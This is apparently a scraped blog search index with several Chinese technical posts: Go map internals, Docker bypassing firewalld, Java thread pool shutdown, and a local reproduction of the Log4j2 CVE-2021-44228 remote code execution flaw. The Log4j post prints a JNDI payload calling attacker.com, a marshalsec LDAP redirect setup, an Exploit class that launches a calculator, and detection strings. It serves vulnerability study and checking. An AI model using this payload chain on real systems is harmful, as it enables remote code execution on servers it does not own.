tophash 数组所处的位置，另一个( insertk)指向 cell 的位置（也就是 key 最终放置的地址），当然，对应 value 的位置就很容易定位出来了。这三者实际上都是关联的，在 tophash 数组中的索引位置决定了 key 在整个 bucket 中的位置（共 8 个 key），而 value 的位置需要“跨过” 8 个 key 的长度。\n在循环的过程中，inserti 和 insertk 分别指向第一个找到的空闲的 cell。如果之后在 map 没有找到 key 的存在，也就是说原来 map 中没有此 key，这意味着插入新 key。那最终 key 的安置地址就是第一次发现的“空位”（tophash 是 empty）。\n如果这个 bucket 的 8 个 key 都已经放置满了，那在跳出循环后，发现 inserti 和 insertk 都是空，这时候需要在 bucket 后面挂上 overflow bucket。当然，也有可能是在 overflow bucket 后面再挂上一个 overflow bucket。这就说明，太多 key hash 到了此 bucket。\n在正式安置 key 之前，还要检查 map 的状态，看它是否需要进行扩容。如果满足扩容的条件，就主动触发一次扩容操作。\n这之后，整个之前的查找定位 key 的过程，还得再重新走一次。因为扩容之后，key 的分布都发生了变化。\n最后，会更新 map 相关的值，如果是插入新 key，map 的元素数量字段 count 值会加 1；在函数之初设置的 hashWriting 写标志出会清零。\nmap的删除 写操作底层的执行函数是 mapdelete\n1  func mapdelete(t *maptype, h *hmap, key unsafe.Pointer)   它首先会检查 h.flags 标志，如果发现写标位是 1，直接 panic，因为这表明有其他协程同时在进行写操作。\n计算 key 的哈希，找到落入的 bucket。检查此 map 如果正在扩容的过程中，直接触发一次搬迁操作。\n删除操作同样是两层循环，核心还是找到 key 的具体位置。寻找过程都是类似的，在 bucket 中挨个 cell 寻找。\n找到对应位置后，对 key 或者 value 进行“清零”操作： 最后，将 count 值减 1，将对应位置的 tophash 值置成 Empty。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  func mapdelete(t *maptype, h *hmap, key unsafe.Pointer) { if raceenabled \u0026amp;\u0026amp; h != nil { callerpc := getcallerpc() pc := funcPC(mapdelete) racewritepc(unsafe.Pointer(h), callerpc, pc) raceReadObjectPC(t.key, key, callerpc, pc) } if msanenabled \u0026amp;\u0026amp; h != nil { msanread(key, t.key.size) } if h == nil || h.count == 0 { return } if h.flags\u0026amp;hashWriting != 0 { throw(\u0026#34;concurrent map writes\u0026#34;) } alg := t.key.alg hash := alg.hash(key, uintptr(h.hash0)) // Set hashWriting after calling alg.hash, since alg.hash may panic,  // in which case we have not actually done a write (delete).  h.flags |= hashWriting bucket := hash \u0026amp; bucketMask(h.B) if h.growing() { growWork(t, h, bucket) } b := (*bmap)(add(h.buckets, bucket*uintptr(t.bucketsize))) top := tophash(hash) search: for ; b != nil; b = b.overflow(t) { for i := uintptr(0); i \u0026lt; bucketCnt; i++ { if b.tophash[i] != top { continue } k := add(unsafe.Pointer(b), dataOffset+i*uintptr(t.keysize)) k2 := k if t.indirectkey { k2 = *((*unsafe.Pointer)(k2)) } if !alg.equal(key, k2) { continue } // Only clear key if there are pointers in it.  // 对key清零  if t.indirectkey { *(*unsafe.Pointer)(k) = nil } else if t.key.kind\u0026amp;kindNoPointers == 0 { memclrHasPointers(k, t.key.size) } v := add(unsafe.Pointer(b), dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize)) // 对value清零  if t.indirectvalue { *(*unsafe.Pointer)(v) = nil } else if t.elem.kind\u0026amp;kindNoPointers == 0 { memclrHasPointers(v, t.elem.size) } else { memclrNoHeapPointers(v, t.elem.size) } // 高位hash清零  b.tophash[i] = empty // 个数减一  h.count-- break search } } if h.flags\u0026amp;hashWriting == 0 { throw(\u0026#34;concurrent map writes\u0026#34;) } h.flags \u0026amp;^= hashWriting }   Go 语言中只要是可比较的类型都可以作为 key。除开 slice，map，functions 这几种类型，其他类型都是 OK 的。具体包括：布尔值、数字、字符串、指针、通道、接口类型、结构体、只包含上述类型的数组。这些类型的共同特征是支持 == 和 != 操作符， k1==k2 时，可认为 k1 和 k2 是同一个 key。如果是结构体，则需要它们的字段值都相等，才被认为是相同的 key。 当用 float64 作为 key 的时候，先要将其转成 unit64 类型，再插入 key 中。 顺便说一句，任何类型都可以作为 value，包括 map 类型。\nmap的并发访问 map 并不是一个线程安全的数据结构。同时读写一个 map 是不安全的，如果被检测到，会直接 panic。\n解决方法1：读写锁 sync.RWMutex。将map与读写锁定义在一个结构体，访问时加锁解锁\n解决方法2：使用golang提供的 sync.Map\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  func main() { m := sync.Map{} m.Store(1, 1) i := 0 go func() { for i \u0026lt; 1000 { m.Store(1, 1) i++ } }() go func() { for i \u0026lt; 1000 { m.Store(2, 2) i++ } }() go func() { for i \u0026lt; 1000 { fmt.Println(m.Load(1)) i++ } }() for { runtime.GC() } }   最后看一看下列代码如果觉得和想的不一样，可以试试并想想为什么。\n1 2 3 4  var m map[string]string //m == nil  delete(m,\u0026#34;name\u0026#34;) //不会panic  fmt.Println(m[\u0026#34;name\u0026#34;]) //返回类型默认值  m[\u0026#34;name\u0026#34;] = \u0026#34;Li\u0026#34; //panic   总结 总结一下，Go 语言中，通过哈希查找表实现 map，用链表法解决哈希冲突。\n通过 key 的哈希值将 key 散落到不同的桶中，每个桶中有 8 个 cell。哈希值的低位决定桶序号，高位标识同一个桶中的不同 key。\n当向桶中添加了很多 key，造成元素过多，或者溢出桶太多，就会触发扩容。扩容分为等量扩容和 2 倍容量扩容。扩容后，原来一个 bucket 中的 key 一分为二，会被重新分配到两个桶中。\n扩容过程是渐进的，主要是防止一次扩容需要搬迁的 key 数量过多，引发性能问题。触发扩容的时机是增加了新元素，bucket 搬迁的时机则发生在赋值、删除期间，每次最多搬迁两个 bucket。\n查找、赋值、删除的一个很核心的内容是如何定位到 key 所在的位置.\n","permalink":"http://bingerambo.com/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/","tags":["Go"],"title":"go-map源码介绍"},{"categories":["Linux"],"contents":"linux防火墙firewall无法禁用docker端口映射问题\n通过命令检查docker\n1 2 3 4 5 6 7 8 9 10  # 查找端口5001服务的进程，进程好为$pid netstat -antlp |grep 5001 ps -ef |grep $pid # 端口tcp服务测试 curl http://127.0.0.1:5001 # 发现服务端口没有被拒绝，可访问   操作界面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  [root@node1 ~]# [root@node1 ~]# netstat -antlp |grep :5001 tcp6 0 0 :::5001 :::* LISTEN 92108/docker-proxy [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# ps -ef |grep 92108 root 81120 75037 0 10:31 pts/3 00:00:00 grep --color=auto 92108 root 92108 89252 0 Dec23 ? 00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 5001 -container-ip 172.18.0.10 -container-port 8080 [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# curl http://127.0.0.1:5001 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;308 Permanent Redirect\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;308 Permanent Redirect\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# iptables-save |grep 5001 -A DOCKER ! -i br-26197ef9daf9 -p tcp -m tcp --dport 5001 -j DNAT --to-destination 172.18.0.10:8080 [root@node1 ~]#   问题：防火墙firewalld已配置5001端口禁用，但测试发现该端口仍能访问。\n方式一：修改iptables 在docker中运行第三方服务时，通常需要绑定服务端口到本地主机。但使用 -p 参数进行的端口映射，会自动在iptables中建立规则，绕过firewalld，这对于端口级的黑白名单控制管理是很不利的，所以我们需要对iptables进行手动修改。\n这里以从名为centos.19.09.05的image建立一个容器为例：\n首先，如果系统是CentOS7的话，需要关闭自带firewalld防火墙，并切换为iptables.\n假设需要将新容器的27017端口映射到主机的27017端口，一般情况下我们使用命令\n1  docker run -idt -p 27017:27017 centos.19.09.05 /bin/bash   在容器中27017端口服务运行起来后，我们在外网使用端口扫描工具，发现本地主机的27017端口已经打开了，而我们还未在防火墙上进行开放操作；此时检查iptabes规则：\n1  iptables --list   发现在Chain DOCKER下多出了一条\n1 2 3  Chain DOCKER (1 references) target prot opt source destination ACCEPT tcp -- anywhere 172.17.0.2 tcp dpt:27017   其中172.17.0.2为该容器在docker网桥中的IP，可见该规则允许任意来源的地址访问27017端口，所以我们需要删除该规则，并替换成安全性更高的规则。\n1 2 3 4 5  #删除DOCKER链中的1号规则；如果待删除规则不位于第一行，则将数字改为对应行号 iptables -D DOCKER 1 #此容器只接受来自地址123.345.456.567的连接请求 iptables -A DOCKER -s 123.345.456.567 -d 172.17.0.2 -p tcp --sport 27017 -j ACCEPT   再次进行端口扫描，发现27017端口已经关闭，只有IP为123.234.345.456的主机能够连接。\niptables端口屏蔽命令，参考如下\n1 2 3 4 5 6 7 8 9  # tcp # iptables -D INPUT -p ${protocl_list[$i]} --dport ${port_list[$i]} -j REJECT --reject-with tcp-reset iptables -D INPUT -p tcp --dport 5001 -j REJECT --reject-with tcp-reset # udp # iptables -D INPUT -p ${protocl_list[$i]} --dport ${port_list[$i]} -j DROP iptables -D INPUT -p udp --dport 33333 -j DROP   方式二：修改docker配置 还有一种更简单的方式。因为docker绕过防火墙的原理是修改了iptables，那不让它修改即可，此方法无需切换默认防火墙。\n--iptables=false\n按照https://blog.csdn.net/qadzhangc/article/details/96140703 所述设置即可，经试验不可省略步骤，否则可能造成容器无法连接外网。\n1 2 3 4 5 6 7 8  vim /etc/default/docker #修改文件，此处设置等同于在创建容器时手动指定iptables=false参数 DOCKER_OPTS=\u0026#34;--dns 8.8.8.8 --dns 8.8.4.4 --iptables=false\u0026#34; vim /etc/docker/daemon.json { \u0026#34;iptables\u0026#34;: false }#此处对更改设置之前创建的容器也有效，编辑后需重启docker服务   对ufw的设置主要是为容器建立起转发，如果容器内的服务不需要访问外网，不做也可以。\nfirewalld的操作与ufw有些不同\n1 2 3 4 5 6 7 8 9  #ubuntu(ufw)操作为 vim /etc/default/ufw DEFAULT_FORWARD_POLICY=\u0026#34;ACCEPT\u0026#34; #对应centos(firewalld)上操作为： firewall-cmd --permanent --direct --add-rule ipv4 filter FORWARD_direct 0 -i eth0 -j ACCEPT #eth0为宿主机网卡名 firewall-cmd --permanent --direct --add-rule ipv4 filter FORWARD_direct 0 -o eth0 -j ACCEPT firewall-cmd --reload   1 2 3 4 5 6 7 8 9 10 11 12  ubuntu(ufw): vim /etc/ufw/before.rules 在`*filter`前面添加下面内容 *nat :POSTROUTING ACCEPT [0:0] -A POSTROUTING ! -o docker0 -s 172.17.0.0/16 -j MASQUERADE COMMIT centos(firewalld): firewall-cmd --zone=public --add-masquerade #默认docker0在public zone里 firewall-cmd --reload   附录 解决docker容器开启端口映射后，会自动在防火墙上打开端口的问题\n","permalink":"http://bingerambo.com/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/","tags":["Linux"],"title":"linux防火墙firewall无法禁用docker端口映射问题"},{"categories":["Java"],"contents":"背景 最近，互联网上曝出了 Apache Log4j2 中的远程代码执行漏洞，攻击者可利用此漏洞构造特殊的数据请求包，最终触发远程代码执行。\n要知道，绝大部分的Java应用用的都是Log4j的包记录日志，而很多互联网公司用的是Log4j2，据“白帽”分析确认，几乎所有技术巨头如百度等都是该 Log4j 远程代码执行漏洞的受害者。\n漏洞原理官方表述是：Apache Log4j2 中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。\n通俗简单的说就是：在打印日志的时候，如果你的日志内容中包含[关键词] ${，攻击者就能将关键字所包含的内容当作变量来替换成任何攻击命令，并且执行。\n由于 Apache Log4j2 的某些函数具有递归分析函数，因此攻击者可以直接构造恶意请求来触发远程代码执行漏洞。\nApache Log4j2\nApache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。\n漏洞检测方案\n1、通过流量监测设备监控是否有相关 DNSLog 域名的请求\n2、通过监测相关日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。\n漏洞详情：\nApache Log4j 远程代码执行漏洞 严重程度: 严重由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置**漏洞情况分析：**Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。\n漏洞编号：暂缺漏洞\n等级： 高危，该漏洞影响范围极广，危害极大。\nCVSS评分： 10（最高级）\n漏洞状态：\n受影响的版本： Apache log4j2 2.0 - 2.14.1 版本均受影响。\n安全版本： Apache log4j-2.15.0-rc2\n触发过程  用户发送数据到服务器，不管什么协议，http也好，别的也好 服务器记录用户请求中的数据，数据中包含恶意payload：${jndi:ldap://attacker.com/a}，其中attacker.com是攻击者的服务器 log4j向attacker.com发送请求（jndi）时触发漏洞，因为有个$符号 log4j收到的jndi响应中包含一个java class文件路径，比如是 http://second-stage.attacker.com/Exploit.class，这个class文件会被log4j所运行在的服务器加载运行 第4步中注入的java class文件中的代码是攻击者的攻击代码  本地windows环境复现操作 1. 注入程序（脚本）准备 编译Exploit.java，该注入程序为打开计算器操作\n1 2 3 4  git clone https://github.com/tangxiaofeng7/apache-log4j-poc.git cd apache-log4j-poc/src/main/java javac Exploit.java   Exploit.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  public class Exploit { public Exploit() {} static { try { String[] cmds = System.getProperty(\u0026#34;os.name\u0026#34;).toLowerCase().contains(\u0026#34;win\u0026#34;) ? new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;, \u0026#34;calc.exe\u0026#34;} : new String[]{\u0026#34;open\u0026#34;,\u0026#34;/System/Applications/Calculator.app\u0026#34;}; java.lang.Runtime.getRuntime().exec(cmds).waitFor(); }catch (Exception e){ e.printStackTrace(); } } public static void main(String[] args) { Exploit e = new Exploit(); } }   2. 启动fileserver 服务url：127.0.0.1:8989/files ， fileserver同目录下有tmp放置files，这里放了Exploit.class\n1  ./fileserver   fileserver 是自己用go写的httpserver，端口：8989，用于文件下载\n1 2 3  $ ./fileserver 2021/12/14 16:51:27 Server started on localhost:8989, use ./tmp for uploading files and /files/{fileName} for downloading   3. 编译运行marshalsec工具 启动LDAPRefServer ， 重定向到 http://127.0.0.1:8989/files/#Exploit\n1 2 3 4 5 6  git clone https://github.com/mbechler/marshalsec.git cd marshalsec # Java 8 required mvn clean package -DskipTests cd target java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://127.0.0.1:8989/files/#Exploit\u0026#34;   启动后，监听1389端口\n1 2 3  $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://127.0.0.1:8989/files/#Exploit\u0026#34; Listening on 0.0.0.0:1389   4. 本地IDE环境运行log4j 说明： 如果log4j.java 同目录下放置了Exploit.java 则不需要运行fileserver提供Exploit.class\nlog4j.java\n1 2 3 4 5 6 7 8 9 10 11 12 13  import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j { private static final Logger logger = LogManager.getLogger(log4j.class); public static void main(String[] args) { //The default trusturlcodebase of the higher version JDK is false  System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:ldap://127.0.0.1:1389/Exploit}\u0026#34;); } }   5. 运行界面 重定向到hacker提供的服务\n执行hacker的注入程序或脚本\n6. log4j项目pom.xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-rce\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt;   漏洞检查 根据项目使用log方式，运行log实例检查，看是否会触发Exploit程序执行。如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13  String jndiErr = \u0026#34;${jndi:ldap://127.0.0.1:1389/Exploit}\u0026#34; // case 1. log.error(jndiErr); // case 2. logger = ... logger.error(jndiErr); // case 3. Logger = ... Logger.error(jndiErr); // ...   附录 试试CVE-2021-44228 log4j2 rce\n","permalink":"http://bingerambo.com/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现"},{"categories":["Java"],"contents":"线程池的优雅关闭实践 平时开发中，大家更多的关注的是线程池的创建、任务的提交和执行。往往会忽略线程池的关闭，甚至忘记调用shutdown()方法，导致内存溢出。大多知道需要调用shutdown()关闭线程池，也少研究其真正的关闭过程。\n首先看源码中的一句注释：\n A pool that is no longer referenced in a program and has no remaining threads will be shutdown automatically. 如果程序中不再持有线程池的引用，并且线程池中没有线程时，线程池将会自动关闭。\n 线程池自动关闭的两个条件：1、线程池的引用不可达；2、线程池中没有线程；\n这里对于条件2解释一下，线程池中没有线程是指线程池中的所有线程都已运行完自动消亡。然而我们常用的FixedThreadPool的核心线程没有超时策略，所以并不会自动关闭。\n展示两种不同线程池 不关闭 的情况：\n1、FixedThreadPool 示例\n1 2 3 4 5 6 7  public static void main(String[] args) { while(true) { ExecutorService executorService = Executors.newFixedThreadPool(8); executorService.execute(() -\u0026gt; System.out.println(\u0026#34;running\u0026#34;)); executorService = null; } }   输出结果：\n1 2 3 4 5 6 7 8 9  running ...... running Exception in thread \u0026#34;main\u0026#34; java.lang.OutOfMemoryError: unable to create new native thread at java.lang.Thread.start0(Native Method) at java.lang.Thread.start(Thread.java:714) at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:950) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1357) at test.PoolTest.main(PoolTest.java:29)   因为FixedThreadPool的核心线程不会自动超时关闭，使用时必须在适当的时候调用shutdown()方法。\n2、 CachedThreadPool 示例\n1 2 3 4 5 6 7 8 9 10  public static void main(String[] args) { while(true) { // 默认keepAliveTime为 60s  ExecutorService executorService = Executors.newCachedThreadPool(); ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) executorService; // 为了更好的模拟，动态修改为1纳秒  threadPoolExecutor.setKeepAliveTime(1, TimeUnit.NANOSECONDS); threadPoolExecutor.execute(() -\u0026gt; System.out.println(\u0026#34;running\u0026#34;)); } }   输出结果：\n1 2 3 4 5 6  running running running running running ......   CachedThreadPool 的线程 keepAliveTime 默认为 60s ，核心线程数量为 0 ，所以不会有核心线程存活阻止线程池自动关闭。 详见 线程池之ThreadPoolExecutor构造 ，为了更快的模拟，构造后将 keepAliveTime 修改为1纳秒，相当于线程执行完马上会消亡，所以线程池可以被回收。实际开发中，如果CachedThreadPool 确实忘记关闭，在一定时间后是可以被回收的。但仍然建议显示关闭。\n然而，线程池关闭的意义不仅仅在于结束线程执行，避免内存溢出，因为大多使用的场景并非上述示例那样 朝生夕死。线程池一般是持续工作的全局场景，如数据库连接池。\n本文更多要讨论的是当线程池调用shutdown方法后，会经历些什么？思考一下几个问题：\n  是否可以继续接受新任务？继续提交新任务会怎样？ 等待队列里的任务是否还会执行？ 正在执行的任务是否会立即中断？   问题1：是否可以继续接受新任务？继续提交新任务会怎样？\n1 2 3 4 5 6  public static void main(String[] args) { ThreadPoolExecutor executor = new ThreadPoolExecutor(4, 4, 10, TimeUnit.SECONDS, new LinkedBlockingQueue\u0026lt;\u0026gt;()); executor.execute(() -\u0026gt; System.out.println(\u0026#34;before shutdown\u0026#34;)); executor.shutdown(); executor.execute(() -\u0026gt; System.out.println(\u0026#34;after shutdown\u0026#34;)); }   输出结果如下：\n1 2 3 4 5 6  before shutdown Exception in thread \u0026#34;main\u0026#34; java.util.concurrent.RejectedExecutionException: Task PoolTest$$Lambda$2/142257191@3e3abc88 rejected from java.util.concurrent.ThreadPoolExecutor@6ce253f1[Terminated, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 1] at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2047) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:823) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1369) at PoolTest.main(PoolTest.java:12)   当线程池关闭后，继续提交新任务会抛出异常。这句话也不够准确，不一定是抛出异常，而是执行拒绝策略，默认的拒绝策略是抛出异常。可参见 线程池之ThreadPoolExecutor构造 里面自定义线程池的例子，自定义了忽略策略，但被拒绝时并没有抛出异常。\n问题2：等待队列里的任务是否还会执行？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  public class WaitqueueTest { public static void main(String[] args) { BlockingQueue\u0026lt;Runnable\u0026gt; workQueue = new LinkedBlockingQueue\u0026lt;\u0026gt;(); for(int i = 1; i \u0026lt;= 100 ; i++){ workQueue.add(new Task(String.valueOf(i))); } ThreadPoolExecutor executor = new ThreadPoolExecutor(1, 1, 10, TimeUnit.SECONDS, workQueue); executor.execute(new Task(\u0026#34;0\u0026#34;)); executor.shutdown(); System.out.println(\u0026#34;workQueue size = \u0026#34; + workQueue.size() + \u0026#34; after shutdown\u0026#34;); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { for(int i = 1; i \u0026lt;= 10; i++){ System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is running\u0026#34;); } System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is over\u0026#34;); } } }   这个demo解释一下，我们用LinkedBlockingQueue构造了一个线程池，在线程池启动前，我们先将工作队列填充100个任务，然后执行task 0 后立即shutdown()线程池，来验证线程池关闭队列的任务运行状态。 输出结果如下：\n1 2 3 4 5 6 7 8  ...... task 0 is running task 0 is over workQueue size = 100 after shutdown //表示线程池关闭后，队列任然有100个任务 task 1 is running ...... task 100 is running task 100 is over   从结果中我们可以看到，线程池虽然关闭，但是队列中的任务任然继续执行，所以用 shutdown()方式关闭线程池时需要考虑是否是你想要的效果。\n如果你希望线程池中的等待队列中的任务不继续执行，可以使用shutdownNow()方法，将上述代码进行调整，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  public class WaitqueueTest { public static void main(String[] args) { BlockingQueue\u0026lt;Runnable\u0026gt; workQueue = new LinkedBlockingQueue\u0026lt;\u0026gt;(); for(int i = 1; i \u0026lt;= 100 ; i++){ workQueue.add(new Task(String.valueOf(i))); } ThreadPoolExecutor executor = new ThreadPoolExecutor(1, 1, 10, TimeUnit.SECONDS, workQueue); executor.execute(new Task(\u0026#34;0\u0026#34;)); // shutdownNow有返回值，返回被抛弃的任务list  List\u0026lt;Runnable\u0026gt; dropList = executor.shutdownNow(); System.out.println(\u0026#34;workQueue size = \u0026#34; + workQueue.size() + \u0026#34; after shutdown\u0026#34;); System.out.println(\u0026#34;dropList size = \u0026#34; + dropList.size()); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { for(int i = 1; i \u0026lt;= 10; i++){ System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is running\u0026#34;); } System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is over\u0026#34;); } } }   输出结果如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13  task 0 is running workQueue size = 0 after shutdown task 0 is running task 0 is running task 0 is running task 0 is running task 0 is running task 0 is running task 0 is running task 0 is running task 0 is running dropList size = 100 task 0 is over   从上述输出可以看到，只有任务0执行完毕，其他任务都被drop掉了，dropList的size为100。通过dropList我们可以对未处理的任务进行进一步的处理，如log记录，转发等；\n问题3：正在执行的任务是否会立即中断？\n要验证这个问题，需要对线程的 interrupt 方法有一定了解。\n 推荐阅读 ——线程中断机制 关于 interrupt 方法： 首先，一个线程不应该由其他线程来强制中断或停止，而是应该由线程自己自行停止。 所以，Thread.stop, Thread.suspend, Thread.resume 都已经被废弃了。 而 Thread.interrupt 的作用其实也不是中断线程，而是「通知线程应该中断了」，具体到底中断还是继续运行，应该由被通知的线程自己处理。 具体来说，当对一个线程，调用 interrupt() 时， ① 如果线程处于被阻塞状态（例如处于sleep, wait, join 等状态），那么线程将立即退出被阻塞状态，并抛出一个InterruptedException异常。仅此而已。 ② 如果线程处于正常活动状态，那么会将该线程的中断标志设置为 true，仅此而已。被设置中断标志的线程将继续正常运行，不受影响。 interrupt() 并不能真正的中断线程，需要被调用的线程自己进行配合才行。也就是说，一个线程如果有被中断的需求，那么就可以这样做。 ① 在正常运行任务时，经常检查本线程的中断标志位，如果被设置了中断标志就自行停止线程。 ② 在调用阻塞方法时正确处理InterruptedException异常。（例如，catch异常后就结束线程。）\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  public class InteruptTest { public static void main(String[] args) throws InterruptedException { ThreadPoolExecutor executor = new ThreadPoolExecutor(1, 1, 10, TimeUnit.SECONDS, new LinkedBlockingQueue\u0026lt;\u0026gt;()); executor.execute(new Task(\u0026#34;0\u0026#34;)); Thread.sleep(1); executor.shutdown(); System.out.println(\u0026#34;executor has been shutdown\u0026#34;); } static class Task implements Runnable { String name; public Task(String name) { this.name = name; } @Override public void run() { for (int i = 1; i \u0026lt;= 100 \u0026amp;\u0026amp; !Thread.interrupted(); i++) { Thread.yield(); System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is running, round \u0026#34; + i); } } } }   输出结果如下：\n1 2 3 4 5 6 7 8 9  task 0 is running, round 1 task 0 is running, round 2 task 0 is running, round 3 ...... task 0 is running, round 28 executor has been shutdown ...... task 0 is running, round 99 task 0 is running, round 100   为了体现在任务执行中打断，在主线程进行短暂 sleep ， task 中 调用 Thread.yield() ，出让时间片。从结果中可以看到，线程池被关闭后，正在运行的任务没有被 interrupt。说明shutdown()方法不会 interrupt 运行中线程。再将其改修改为shutdownNow() 后输出结果如下：\n1 2 3 4 5 6 7 8  task 0 is running, round 1 task 0 is running, round 2 ...... task 0 is running, round 56 task 0 is running, round 57 task 0 is running, round 58 task 0 is running, round 59 executor has been shutdown   修改为shutdownNow() 后，task任务没有执行完，执行到中间的时候就被 interrupt 后没有继续执行了。\n总结，想要正确的关闭线程池，并不是简单的调用shutdown方法那么简单，要考虑到应用场景的需求，如何拒绝新来的请求任务？如何处理等待队列中的任务？如何处理正在执行的任务？想好这几个问题，在确定如何优雅而正确的关闭线程池。\nPS：线程被 interrupt 后，需要再run方法中单独处理 interrupted 状态，interrupt 更类似一个标志位，不会直接打断线程的执行。\n附录 